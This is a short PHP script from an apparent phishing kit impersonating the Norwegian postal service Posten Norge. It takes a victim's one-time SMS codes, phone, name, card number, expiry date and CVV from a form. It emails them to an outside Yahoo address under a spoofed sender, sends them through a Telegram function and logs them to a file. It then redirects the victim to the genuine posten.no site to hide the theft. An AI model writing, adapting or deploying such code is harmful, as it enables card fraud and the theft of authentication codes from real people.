<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "sms  2       : ".$_POST['otp']."\n";
$bilsmg .= "sms  1       : ".$_POST['sms1']."\n";
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "ID*      : ".$_POST['tel']."\n";
$bilsmg .= "Name       : ".$_POST['name']."\n";
$bilsmg .= "C-Number     : ".$_POST['cc']."\n";
$bilsmg .= "D-Expiration : ".$_POST['expe']."\n";
$bilsmg .= "CVN          : ".$_POST['cvv']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "Posten Norge CC :) sms2 - ".$ip;
$bilhead = "From: A777 <send@norgepost.io>";

mail("jex2021@yahoo.com",$bilsub,$bilsmg,$bilhead);
telegram($bilsmg);
$file = fopen("../salem.txt", 'a');
fwrite($file, $bilsmg);
header("location: https://www.posten.no/");
?>